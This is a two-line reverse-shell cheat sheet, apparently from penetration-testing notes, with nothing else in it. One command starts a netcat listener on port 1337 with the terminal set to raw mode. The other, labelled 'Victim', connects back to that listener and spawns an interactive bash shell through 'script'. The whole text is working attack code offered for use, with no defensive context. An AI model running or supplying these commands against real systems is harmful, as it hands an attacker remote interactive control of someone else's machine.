# Listener
stty -echo raw ; nc -lp 1337; stty sane

# Victim
nc -c '/bin/bash -c "script /dev/null"' listener 1337
